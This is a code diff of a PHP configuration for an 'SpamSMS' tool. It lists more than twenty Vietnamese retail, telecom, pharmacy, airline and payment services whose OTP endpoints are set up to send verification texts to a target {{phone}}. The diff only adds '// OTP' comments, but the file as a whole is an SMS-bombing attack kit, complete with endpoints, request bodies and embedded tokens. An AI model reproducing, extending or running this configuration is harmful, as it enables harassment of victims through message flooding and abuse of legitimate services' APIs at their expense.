@@ -429,6 +429,7 @@ $wt = new WT();
  * 5: headers
  * 6: body (method [POST] - [GET = is null])
  */
+// OTP
 $wt->API('TV360', new SpamSMS(
     "https://tv360.vn/public/v1/auth/get-otp-login",
     "POST",
@@ -438,7 +439,7 @@ $wt->API('TV360', new SpamSMS(
     ],
     ["msisdn" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('LongChau', new SpamSMS(
     "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
     "POST",
@@ -452,7 +453,7 @@ $wt->API('LongChau', new SpamSMS(
         "fromSys" => "WEBKHLC",
     ]
 ));
-
+// OTP
 $wt->API('MyViettel', new SpamSMS(
     "https://vietteltelecom.vn/api/get-otp",
     "POST",
@@ -462,7 +463,7 @@ $wt->API('MyViettel', new SpamSMS(
     ],
     '{"msisdn":"{{phone}}","type":"register"}'
 ));
-
+// OTP
 $wt->API('Beautybox', new SpamSMS(
     "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
     "POST",
@@ -473,7 +474,7 @@ $wt->API('Beautybox', new SpamSMS(
     ],
     ["phoneNumber" => "84{{phone}}"]
 ));
-
+// OTP
 $wt->API('Speedlotte', new SpamSMS(
     "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
     "POST",
@@ -486,7 +487,7 @@ $wt->API('Speedlotte', new SpamSMS(
         "case" => "register",
     ]
 ));
-
+// OTP
 $wt->API('Batdongsan', new SpamSMS(
     "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={{phone}}",
     "GET",
@@ -495,7 +496,7 @@ $wt->API('Batdongsan', new SpamSMS(
     ],
     null
 ));
-
+// OTP
 $wt->API('Ghn', new SpamSMS(
     "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
     "POST",
@@ -508,7 +509,7 @@ $wt->API('Ghn', new SpamSMS(
         "type" => "register",
     ]
 ));
-
+// OTP
 $wt->API('Vinamilk', new SpamSMS(
     "https://new.vinamilk.com.vn/api/account/getotp",
     "POST",
@@ -522,7 +523,7 @@ $wt->API('Vinamilk', new SpamSMS(
         "phone" => "{{phone}}",
     ]
 ));
-
+// OTP
 $wt->API('Reebok', new SpamSMS(
     "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
     "POST",
@@ -533,7 +534,7 @@ $wt->API('Reebok', new SpamSMS(
     ],
     ["phoneNumber" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('Tokyolife', new SpamSMS(
     "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
     "POST",
@@ -551,7 +552,7 @@ $wt->API('Tokyolife', new SpamSMS(
         "gender" => "male",
     ]
 ));
-
+// OTP
 $wt->API('Best', new SpamSMS(
     "https://v9-cc.800best.com/uc/account/sendSignUpCode?code=0634a1abb823dd1369a0ab5aa9743f29&instanceId=09b23dfe-1b36-454c-85d1-051d58d104bc&validate=0ec55dd5c447946621b63b0f70025f31",
     "POST",
@@ -566,7 +567,7 @@ $wt->API('Best', new SpamSMS(
         "verificationCodeType" => 1,
     ]
 ));
-
+// OTP
 $wt->API('Emartmall', new SpamSMS(
     "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
     "POST",
@@ -576,7 +577,7 @@ $wt->API('Emartmall', new SpamSMS(
     ],
     ["mobile" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('Glxplay', new SpamSMS(
     "https://api.glxplay.io/account/phone/verify?phone={{phone}}",
     "POST",
@@ -587,7 +588,7 @@ $wt->API('Glxplay', new SpamSMS(
     ],
     null
 ));
-
+// OTP
 $wt->API('Medicare', new SpamSMS(
     "https://medicare.vn/api/otp",
     "POST",
@@ -600,7 +601,7 @@ $wt->API('Medicare', new SpamSMS(
         "mobile_country_prefix" => "84",
     ]
 ));
-
+// OTP
 $wt->API('Vietair', new SpamSMS(
     "https://vietair.com.vn/Handler/CoreHandler.ashx",
     "POST",
@@ -617,7 +618,7 @@ $wt->API('Vietair', new SpamSMS(
         "P_TYPE_ACTIVE_CODE" => "DANG_KY_NHAN_OTP",
     ]
 ));
-
+// OTP
 $wt->API('Sapo', new SpamSMS(
     "https://accounts.sapo.vn/otp/send",
     "POST",
@@ -632,7 +633,7 @@ $wt->API('Sapo', new SpamSMS(
         "register_token" => "vonedfHvzxYWDowbZOLDXrsPbGY3f7mG0zXv",
     ]
 ));
-
+// OTP
 $wt->API('Acheckin', new SpamSMS(
     "https://api-gateway.acheckin.io/v1/external/auth/check-existed-account?search={{phone}}",
     "GET",
@@ -643,7 +644,7 @@ $wt->API('Acheckin', new SpamSMS(
     ],
     null
 ));
-
+// OTP
 $wt->API('Bamuoishine', new SpamSMS(
     "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send",
     "POST",
@@ -653,7 +654,7 @@ $wt->API('Bamuoishine', new SpamSMS(
     ],
     ["phone" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('Thefaceshop', new SpamSMS(
     "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
     "POST",
@@ -664,7 +665,7 @@ $wt->API('Thefaceshop', new SpamSMS(
     ],
     ["phoneNumber" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('Vinpearl', new SpamSMS(
     "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
     "POST",
@@ -679,7 +680,7 @@ $wt->API('Vinpearl', new SpamSMS(
         "OtpChannel" => 1,
     ]
 ));
-
+// OTP
 $wt->API('Book365', new SpamSMS(
     "https://book365.vn/ajax/dangky_taikhoan.php",
     "POST",
@@ -700,7 +701,7 @@ $wt->API('Book365', new SpamSMS(
         "dangky_email" => "wusteam123@gmail.com",
     ])
 ));
-
+// OTP
 $wt->API('Medigoapp', new SpamSMS(
     "https://auth.medigoapp.com/prod/getOtp",
     "POST",
@@ -710,7 +711,7 @@ $wt->API('Medigoapp', new SpamSMS(
     ],
     ["phone" => "{{phone}}"]
 ));
-
+// OTP
 $wt->API('Momo', new SpamSMS(
     "https://api.mservice.com.vn:8001/forwarder",
     "POST",
